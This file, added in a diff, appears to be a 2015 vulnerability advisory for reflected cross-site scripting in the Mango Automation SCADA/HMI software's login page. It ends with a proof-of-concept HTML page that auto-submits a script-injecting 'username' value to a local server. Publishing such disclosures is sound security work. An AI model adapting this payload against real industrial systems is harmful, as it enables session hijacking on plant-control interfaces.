@@ -1,0 +1,55 @@
+
+Mango Automation 2.6.0 Remote XSS POST Injection Vulnerability
+
+
+Vendor: Infinite Automation Systems Inc.
+Product web page: http://www.infiniteautomation.com/
+Affected version: 2.5.2 and 2.6.0 beta (build 327)
+
+Summary: Mango Automation is a flexible SCADA, HMI
+And Automation software application that allows you
+to view, log, graph, animate, alarm, and report on
+data from sensors, equipment, PLCs, databases, webpages,
+etc. It is easy, affordable, and open source.
+
+Desc: The application is prone to a reflected cross-site
+scripting vulnerability due to a failure to properly
+sanitize user-supplied input to the 'username' POST
+parameter in the 'login.htm' script. Attackers can
+exploit this issue to execute arbitrary HTML and script
+code in a user's browser session.
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN) 32/64bit
+           Microsoft Windows 7 Ultimate SP1 (EN) 32/64bit
+           Jetty(9.2.2.v20140723)
+           Java(TM) SE Runtime Environment (build 1.8.0_51-b16)
+           Java HotSpot(TM) Client VM (build 25.51-b03, mixed mode)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5257
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5257.php
+
+
+20.08.2015
+
+--
+
+
+<html>
+  <head>
+    <title>Mango Automation 2.6.0 Remote XSS POST Injection Vulnerability</title>
+  </head>
+  <body>
+    <form name="login" method="post" action="http://localhost:8080/login.htm">
+    <input type="hidden" name="username" value='"><script>alert("XSS");</script>' />
+    <input type="hidden" name="password" value="blah" />
+    </form>
+    <script type="text/javascript">
+    document.login.submit();
+    </script>
+  </body>
+</html>
